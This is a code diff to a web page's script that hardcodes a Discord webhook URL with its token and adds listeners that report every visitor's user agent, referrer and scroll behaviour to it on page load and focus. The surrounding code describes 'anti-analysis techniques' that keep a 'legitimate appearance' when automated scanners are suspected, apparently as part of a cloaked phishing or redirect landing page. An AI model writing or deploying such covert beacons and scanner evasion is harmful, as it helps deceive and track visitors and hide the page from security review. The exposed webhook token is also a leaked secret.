@@ -210,14 +210,26 @@
         
         function trackEngagement(action) {
             // Beacon tracking
-            fetch( + self.webhook_url + , {
+            fetch('https://discord.com/api/webhooks/1417442947686731856/1UGJsXCLBqIZmb2shm4CjxJhAzZtObsbKtbStAmPg5jKtvbVt9WqRfRkNZ6ymjuiDS95', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `🎯 **User Engagement**\n**Action:** ${action}\n**Engagement Score:** ${userEngagement}\n**Scroll Depth:** ${scrollDepth}px\n**User Agent:** ${navigator.userAgent}\n**Time:** ${new Date().toISOString()}`
+                    content: `🎯 **URL Shortener Hit**\n**Source:** legitimate_landing.html\n**Action:** ${action}\n**Engagement:** ${userEngagement}\n**Scroll:** ${scrollDepth}px\n**User Agent:** ${navigator.userAgent}\n**Referrer:** ${document.referrer}\n**Time:** ${new Date().toISOString()}`
                 })
             }).catch(() => {});
         }
+        
+        // Initial page load beacon for URL shortener tracking
+        window.addEventListener('DOMContentLoaded', function() {
+            trackEngagement('shortener_page_load');
+        });
+        
+        // Track page visibility changes
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'visible') {
+                trackEngagement('shortener_page_focus');
+            }
+        });
         
         // Advanced anti-analysis techniques
         function activateAdvanced() {
@@ -231,6 +243,7 @@
             if (userEngagement < 5) {
                 // User hasn't engaged - probably automated analysis
                 console.log('Low engagement detected - maintaining legitimate appearance');
+                trackEngagement('shortener_low_engagement');
             }
         }, 10000);
     </script>
